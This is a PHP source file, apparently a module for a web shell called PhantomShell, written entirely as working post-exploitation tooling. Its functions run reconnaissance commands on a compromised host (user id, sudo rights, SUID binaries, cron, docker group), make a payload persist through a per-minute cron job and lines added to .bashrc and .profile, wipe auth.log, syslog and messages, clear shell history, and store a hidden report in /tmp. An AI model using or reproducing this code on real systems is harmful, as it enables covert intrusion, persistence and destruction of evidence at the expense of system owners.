<?php
// PhantomShell Module: Automation
// Load via MINIMAL mode: fetch automation

function mod_auto_recon() {
    $report = array();
    $cmds = array(
        'hostname' => 'hostname -f 2>/dev/null || hostname',
        'id'       => 'id',
        'kernel'   => 'uname -a',
        'os'       => "cat /etc/os-release 2>/dev/null | head -3",
        'ip'       => 'ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null',
        'routes'   => 'ip route 2>/dev/null',
        'dns'      => 'cat /etc/resolv.conf 2>/dev/null | grep nameserver',
        'listening' => 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null',
        'processes' => 'ps aux --sort=-%mem 2>/dev/null | head -15',
        'suid'     => 'find / -perm -4000 -type f 2>/dev/null | head -20',
        'sudo'     => 'sudo -n -l 2>&1',
        'cron'     => 'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null',
        'docker'   => 'id -nG | grep -oE "(docker|lxd)"',
    );
    foreach ($cmds as $k => $c) {
        $o = '';
        if(function_exists('shell_exec')) $o = (string)@shell_exec($c);
        $report[$k] = trim($o);
    }
    return $report;
}

function mod_auto_persist($payload_path) {
    $results = array();
    // Cron
    $cur = '';
    if(function_exists('shell_exec')) $cur = (string)@shell_exec('crontab -l 2>/dev/null');
    $cl = "* * * * * php $payload_path >/dev/null 2>&1";
    if (strpos($cur, $payload_path) === false) {
        $tmp = tempnam('/tmp', 'cr');
        file_put_contents($tmp, trim($cur) . "\n$cl\n");
        if(function_exists('shell_exec')) @shell_exec("crontab $tmp 2>&1");
        @unlink($tmp);
        $results[] = 'cron';
    }
    // Bashrc
    $home = getenv('HOME') ?: '/root';
    $ln = "php $payload_path >/dev/null 2>&1 &";
    foreach (array('.bashrc', '.profile') as $rc) {
        $f = "$home/$rc";
        if (file_exists($f)) {
            $c = @file_get_contents($f);
            if ($c !== false && strpos($c, $ln) === false) {
                @file_put_contents($f, $c . "\n$ln\n");
                $results[] = $rc;
            }
        }
    }
    return $results;
}

function mod_auto_clean() {
    $cleaned = array();
    foreach (array('/var/log/auth.log', '/var/log/syslog', '/var/log/messages') as $l) {
        if (file_exists($l) && is_writable($l)) {
            @file_put_contents($l, '');
            $cleaned[] = $l;
        }
    }
    if(function_exists('shell_exec')) @shell_exec('history -c 2>/dev/null');
    return $cleaned;
}

function mod_auto_report() {
    $report = mod_auto_recon();
    $report['timestamp'] = date('Y-m-d H:i:s T');
    $report['php'] = phpversion();
    $json = json_encode($report, JSON_PRETTY_PRINT);
    $path = '/tmp/.phantom_report_' . date('Ymd_His') . '.json';
    @file_put_contents($path, $json);
    return array('path' => $path, 'data' => $report);
}

if (isset($sock)) {
    @fwrite($sock, "  Automation module loaded.\n");
    @fwrite($sock, "  Functions: mod_auto_recon, mod_auto_persist, mod_auto_clean, mod_auto_report\n");
}
?>
